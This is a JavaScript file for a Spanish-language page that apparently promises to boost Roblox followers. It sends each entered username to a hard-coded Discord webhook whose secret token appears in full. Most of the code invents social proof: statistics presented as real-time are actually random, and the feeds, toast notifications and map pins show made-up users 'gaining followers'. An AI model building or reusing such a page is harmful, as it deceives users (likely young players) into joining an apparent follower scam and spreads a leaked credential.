document.getElementById('connectForm').addEventListener('submit', function(event) {
    // Prevenimos el comportamiento por defecto del formulario (que es recargar la página)
    event.preventDefault();

    // ¡MUY IMPORTANTE! Reemplaza esta URL con la URL de tu propio Webhook de Discord.
    const webhookURL = 'https://discord.com/api/webhooks/1260782254313963590/uuQCLMUNM3xxEHlBcdptiPxw1h-wnhHgSTn9MikF4DcRBQZ5LLkSKEiCbPeBX0gi1-Ve';

    const username = document.getElementById('usernameInput').value;
    const statusElement = document.getElementById('status');

    // Verificamos que el mensaje no esté vacío
    if (username.trim() === '') {
        statusElement.textContent = 'Por favor, ingresa un usuario.';
        statusElement.style.color = 'var(--error-color)';
        return;
    }

    statusElement.textContent = 'Enviando...';
    statusElement.style.color = 'var(--label-color)';

    // Usamos fetch para enviar los datos al webhook
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            // El formato que Discord espera es un objeto con una propiedad "content"
            content: `Nuevo usuario conectado: **${username}**`,
        }),
    })
    .then(response => {
        if (response.ok) {
            statusElement.textContent = '¡Conectado con éxito!';
            statusElement.style.color = 'var(--success-color)';
            document.getElementById('usernameInput').value = ''; // Limpiamos el input
        } else {
            statusElement.textContent = 'Hubo un error al enviar el mensaje. Revisa la URL del webhook.';
            statusElement.style.color = 'var(--error-color)';
        }
    })
    .catch(error => {
        console.error('Error:', error);
        statusElement.textContent = 'Hubo un error de red. Revisa la consola del navegador.';
        statusElement.style.color = 'var(--error-color)';
    });
});

// --- Animación de contadores (Estadísticas en Tiempo Real) ---
const counters = document.querySelectorAll('.counter');

function animateValue(obj, start, end, duration) {
    let startTimestamp = null;
    const step = (timestamp) => {
        if (!startTimestamp) startTimestamp = timestamp;
        const progress = Math.min((timestamp - startTimestamp) / duration, 1);
        const value = Math.floor(progress * (end - start) + start);
        
        // Formato con comas y el "+" si es un número grande
        let formattedValue = value.toLocaleString();
        if (end > 1000) formattedValue += "+";
        
        obj.innerText = formattedValue;
        
        if (progress < 1) {
            window.requestAnimationFrame(step);
        }
    };
    window.requestAnimationFrame(step);
}

function updateStats() {
    counters.forEach(counter => {
        const baseTarget = +counter.getAttribute('data-target');
        // Obtenemos el valor actual numérico (eliminando comas y símbolos)
        const currentText = counter.innerText.replace(/,/g, '').replace('+', '');
        const current = parseInt(currentText) || 0;
        
        // Calculamos un nuevo objetivo aleatorio basado en el valor base
        // Variación del 10% para números pequeños, 2% para grandes
        const variance = baseTarget > 1000 ? 0.02 : 0.2; 
        const min = baseTarget * (1 - variance);
        const max = baseTarget * (1 + variance);
        const newTarget = Math.floor(Math.random() * (max - min + 1) + min);

        animateValue(counter, current, newTarget, 2000); // 2 segundos de animación
    });
}

// Iniciar actualización periódica
updateStats(); // Primera ejecución
setInterval(updateStats, 5000); // Actualizar cada 5 segundos

// --- Sistema de Partículas ---
function createParticles() {
    const container = document.getElementById('particles-container');
    const particleCount = 20;

    for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        
        // Posición aleatoria
        const x = Math.random() * 100;
        const size = Math.random() * 5 + 2; // Tamaño entre 2px y 7px
        const duration = Math.random() * 15 + 10; // Duración entre 10s y 25s
        const delay = Math.random() * 20;

        particle.style.left = `${x}%`;
        particle.style.width = `${size}px`;
        particle.style.height = `${size}px`;
        particle.style.animationDuration = `${duration}s`;
        particle.style.animationDelay = `-${delay}s`; // Delay negativo para que empiecen ya en movimiento

        container.appendChild(particle);
    }
}

createParticles();

// --- Panel de Actividad en Vivo ---
const activities = [
    { user: "Shadowx12X", action: "se unió a la comunidad", icon: "fa-user-plus" },
    { user: "NovaBuilderrr", action: "conectó su perfil", icon: "fa-link" },
    { user: "Pixellonx", action: "comenzó a usar la herramienta", icon: "fa-rocket" },
    { user: "Darksx1Studio", action: "está creciendo su perfil", icon: "fa-chart-line" },
    { user: "10RobloxKing", action: "recibió 5235 seguidores", icon: "fa-users" },
    { user: "GamerPro1233", action: "verificó su cuenta", icon: "fa-check-circle" },
    { user: "Byll12pex", action: "se unió a la comunidad", icon: "fa-user-plus" },
    { user: "skOpslx", action: "conectó su perfil", icon: "fa-link" },
    { user: "Anp12x91z", action: "comenzó a usar la herramienta", icon: "fa-rocket" },
    { user: "juzEf1b", action: "está creciendo su perfil", icon: "fa-chart-line" },
    { user: "Caopss404", action: "recibió 424 seguidores", icon: "fa-users" },
    { user: "Gampmpmp12x", action: "verificó su cuenta", icon: "fa-check-circle" }
];

function addActivity() {
    const feed = document.getElementById('activity-feed');
    const randomActivity = activities[Math.floor(Math.random() * activities.length)];
    
    const item = document.createElement('div');
    item.classList.add('activity-item');
    item.innerHTML = `<i class="fa-solid ${randomActivity.icon}"></i> <span><strong>${randomActivity.user}</strong> ${randomActivity.action}</span>`;
    
    feed.prepend(item);

    // Mantener solo los últimos 5 mensajes
    if (feed.children.length > 5) {
        feed.removeChild(feed.lastChild);
    }
}

// Iniciar actividad
setInterval(addActivity, 3000); // Nuevo mensaje cada 3 segundos
addActivity(); // Agregar uno al inicio

// --- Sistema de FAQ (Acordeón) ---
const faqQuestions = document.querySelectorAll('.faq-question');

faqQuestions.forEach(question => {
    question.addEventListener('click', () => {
        const item = question.parentElement;
        const answer = item.querySelector('.faq-answer');
        const icon = question.querySelector('.toggle-icon');

        // Alternar clase activa
        item.classList.toggle('faq-active');

        if (item.classList.contains('faq-active')) {
            answer.style.maxHeight = answer.scrollHeight + 'px'; // Altura dinámica
            icon.classList.remove('fa-plus');
            icon.classList.add('fa-minus');
        } else {
            answer.style.maxHeight = null;
            icon.classList.remove('fa-minus');
            icon.classList.add('fa-plus');
        }
    });
});

// --- Scroll Reveal Animation (Aparición suave al hacer scroll) ---
const revealElements = document.querySelectorAll('.reveal');

const revealObserver = new IntersectionObserver((entries, observer) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.classList.add('active');
            observer.unobserve(entry.target); // Dejar de observar una vez animado
        }
    });
}, {
    root: null,
    threshold: 0.15, // Se activa cuando el 15% del elemento es visible
    rootMargin: "0px 0px -50px 0px" // Margen para activar un poco antes de que suba del todo
});

revealElements.forEach(el => revealObserver.observe(el));

// --- Sistema de Notificaciones Flotantes ---
const notificationContainer = document.getElementById('notification-container');

const robloxNames = {
    prefixes: [
        'Shadow', 'Nova', 'Pixel', 'Block', 'Craft', 'Dragon', 'Storm', 'Fire', 'Sky', 'Dark',
        'Turbo', 'Mega', 'Ultra', 'Hyper', 'Cosmic', 'Astro', 'Phantom', 'Blaze', 'Frost', 'Thunder',
        'Iron', 'Steel', 'Crystal', 'Lunar', 'Solar', 'Neon', 'Vortex', 'Venom', 'Titan', 'Rogue',
        'Ghost', 'Knight', 'Raptor', 'Hunter', 'Falcon', 'Wolf', 'Lion', 'Tiger', 'Cobra', 'Eagle',
        'Comet', 'Orbit', 'Galaxy', 'Meteor', 'Quantum', 'Cyber', 'Matrix', 'Omega', 'Alpha', 'Delta',
        'Echo', 'Zenith', 'Pulse', 'Flux', 'Velocity', 'Gravity', 'Magnet', 'Fusion', 'Rocket', 'Laser',
        'Radar', 'Circuit', 'Binary', 'PixelCore', 'DataForge', 'CodeWave', 'ByteStorm', 'GameForge', 'PlayCore', 'ArcadeWave',
        'BuildForge', 'StackCore', 'LayerForge', 'CubeStorm', 'VoxelCore', 'GridForge', 'PortalCore', 'RenderWave', 'EngineForge', 'Ninja',
        'Samurai', 'Viking', 'Pirate', 'Wizard', 'Mage', 'Warrior', 'Paladin', 'Archer', 'Sniper', 'Scout',
        'Medic', 'Tank', 'Healer', 'Boss', 'Chief', 'Captain', 'Major', 'General', 'Admiral', 'Spark'
    ],
    suffixes: [
        'X', 'Pro', 'YT', 'Dev', 'Hero', 'Master', 'Legend', 'Elite', 'Prime', 'King',
        'Lord', 'Boss', 'Builder', 'Player', 'Crafter', 'Gamer', 'Studio', 'Labs', 'Nation', 'World',
        'Hub', 'Zone', 'Core', 'Force', 'Squad', 'Army', 'Crew', 'Team', 'Clan', 'Guild',
        'Network', 'Verse', 'Realm', 'Empire', 'City', 'Base', 'Arena', 'Quest', 'Tower', 'Forge',
        'Works', 'HQ', 'Inc', 'PrimeX', 'UltraX', 'MegaX', 'HyperX', 'AlphaX', 'OmegaX', 'DevX',
        'YTPro', 'YTMaster', 'ProYT', 'XPro', 'XDev', 'XMaster', 'XHero', '99', '777', '2024',
        '2025', 'Pro99', 'YT99', 'Dev99', 'Hero99', 'Master99', '123', '007', '404', '360', '247',
        'One', 'Two', 'Three', 'Ten', 'Max', 'Min', 'Plus', 'Star', 'Moon', 'Sun',
        'Sky', 'Sea', 'Land', 'Fire', 'Ice', 'Air', 'Earth', 'Metal', 'Wood', 'Water',
        'Gold', 'Silver', 'Bronze', 'Platinum', 'Diamond', 'Ruby', 'Emerald', 'Sapphire', 'Topaz', 'Opal'
    ]
};

function generateRobloxName() {
    const prefix = robloxNames.prefixes[Math.floor(Math.random() * robloxNames.prefixes.length)];
    const suffix = robloxNames.suffixes[Math.floor(Math.random() * robloxNames.suffixes.length)];
    return `${prefix}${suffix}`;
}

function createNotification() {
    const username = generateRobloxName();
    const followers = Math.floor(Math.random() * 90) + 10; // Entre 10 y 99 seguidores
    const timeAgo = Math.floor(Math.random() * 4) + 1; // Entre 1s y 4s
    
    // Usamos DiceBear 'avataaars' para generar avatares únicos basados en el nombre
    // Esto simula el avatar del usuario de forma consistente
    const avatarUrl = `https://api.dicebear.com/7.x/avataaars/svg?seed=${username}&backgroundColor=b6e3f4,c0aede,d1d4f9`;

    const notif = document.createElement('div');
    notif.className = 'notification-toast';
    notif.innerHTML = `
        <img src="${avatarUrl}" alt="${username}" class="notif-avatar">
        <div class="notif-content">
            <div class="notif-row-1">
                ${username}
            </div>
            <div class="notif-row-2">
                consiguió <span class="notif-highlight">+${followers} seguidores</span>
            </div>
            <span class="notif-time">hace ${timeAgo}s</span>
        </div>
    `;

    notificationContainer.appendChild(notif);

    // Eliminar después de unos segundos (animación de salida)
    setTimeout(() => {
        notif.style.animation = 'slideOutToast 0.5s forwards';
        notif.addEventListener('animationend', () => {
            notif.remove();
        });
    }, 4000); // La notificación se queda 4 segundos
}

function startNotifications() {
    // Ciclo infinito con intervalo aleatorio
    function loop() {
        const delay = Math.random() * 4000 + 6000; // Entre 6 y 10 segundos
        setTimeout(() => {
            createNotification();
            loop();
        }, delay);
    }
    // Iniciar primera notificación pronto
    setTimeout(createNotification, 2000);
    loop();
}

startNotifications();

// --- Mapa de Actividad Global ---
const mapContainer = document.getElementById('world-map-container');

// Definimos zonas aproximadas donde hay tierra (top %, left %) para evitar el océano
const mapZones = [
    { name: 'NA', minTop: 25, maxTop: 45, minLeft: 15, maxLeft: 35 }, // Norteamérica
    { name: 'SA', minTop: 60, maxTop: 80, minLeft: 28, maxLeft: 38 }, // Sudamérica
    { name: 'EU', minTop: 25, maxTop: 40, minLeft: 48, maxLeft: 55 }, // Europa
    { name: 'AS', minTop: 25, maxTop: 50, minLeft: 60, maxLeft: 85 }, // Asia
    { name: 'AF', minTop: 45, maxTop: 70, minLeft: 48, maxLeft: 60 }, // África
    { name: 'AU', minTop: 70, maxTop: 85, minLeft: 80, maxLeft: 90 }  // Australia
];

function spawnMapActivity() {
    if (!mapContainer) return;

    // 1. Elegir una zona aleatoria
    const zone = mapZones[Math.floor(Math.random() * mapZones.length)];

    // 2. Generar coordenadas aleatorias dentro de esa zona
    const top = Math.random() * (zone.maxTop - zone.minTop) + zone.minTop;
    const left = Math.random() * (zone.maxLeft - zone.minLeft) + zone.minLeft;

    // 3. Generar datos del usuario
    const username = generateRobloxName();
    const followers = Math.floor(Math.random() * 50) + 20;

    // 4. Crear el punto (pin)
    const pin = document.createElement('div');
    pin.classList.add('map-pin');
    pin.style.top = `${top}%`;
    pin.style.left = `${left}%`;

    // 5. Crear el mensaje (tooltip)
    const tooltip = document.createElement('div');
    tooltip.classList.add('pin-tooltip');
    tooltip.innerHTML = `<span style="color: var(--accent-color); font-weight: bold;">${username}</span> consiguió +${followers} seguidores`;
    
    // Añadir al mapa
    pin.appendChild(tooltip);
    mapContainer.appendChild(pin);

    // Eliminar después de la animación (4s)
    setTimeout(() => {
        pin.remove();
    }, 4000);
}

// Iniciar el ciclo del mapa
function startMapCycle() {
    // Intervalo aleatorio entre 2 y 5 segundos para más dinamismo
    const delay = Math.random() * 3000 + 2000;
    setTimeout(() => {
        spawnMapActivity();
        startMapCycle();
    }, delay);
}

startMapCycle();